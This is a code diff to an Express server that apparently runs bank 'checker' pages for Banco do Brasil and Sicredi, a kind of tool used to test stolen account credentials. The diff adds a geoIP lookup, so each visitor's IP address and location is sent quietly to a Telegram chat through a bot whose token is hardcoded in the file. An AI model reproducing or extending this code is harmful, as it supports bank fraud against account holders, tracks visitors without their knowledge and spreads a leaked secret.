@@ -1,8 +1,13 @@
 import express from "express";
 import requestIp from "request-ip";
-import { Telegraf } from "telegraf";
-import { checker_bb } from "./api.js";
 import "ejs";
+import {
+    Telegraf
+} from "telegraf";
+import {
+    checker_bb
+} from "./api.js";
+import { geoIP } from "./geo_IP.js";
 const app = express();
 
 const bot = new Telegraf('5247604590:AAHiHzBXrM0qdgnbZ1WVZFw-7d87wcPxw0M');
@@ -16,14 +21,16 @@ app.get('/', (req, res) => {
     res.render('index');
 });
 
-app.get('/checkerbb', (req, res) => {
+app.get('/checkerbb', async (req, res) => {
     const clientIp = requestIp.getClientIp(req);
     const dataAtual = new Date();
-    bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco do Brasil\n\nIPv4/IPv6: <code>${clientIp}</code>\n\n${dataAtual.toLocaleString("pt-Br", {
+    bot.telegram.sendMessage(1623828324, `<b>NOVO ACESSO DETECTADO!	&#128752;&#65039;\n\nChecker ➜ Banco do Brasil\n\n${await geoIP(clientIp)}\n\n${dataAtual.toLocaleString("pt-Br", {
         dateStyle: "short",
         timeStyle: "short",
         timeZone: "America/Sao_Paulo"
-    })}\nHorário de São Paulo.</b>`, { parse_mode: 'HTML' });
+    })}\nHorário de São Paulo.</b>`, {
+        parse_mode: 'HTML'
+    });
     res.render('checker', {
         checker_name: 'Banco do Brasil',
         api_tag: 'apibb',
@@ -41,7 +48,9 @@ app.get('/checkersicredi', (req, res) => {
         dateStyle: "short",
         timeStyle: "short",
         timeZone: "America/Sao_Paulo"
-    })}\nHorário de São Paulo.</b>`, { parse_mode: 'HTML' });
+    })}\nHorário de São Paulo.</b>`, {
+        parse_mode: 'HTML'
+    });
     res.render('checker', {
         checker_name: 'Banco Sicredi',
         api_tag: 'apisicredi',
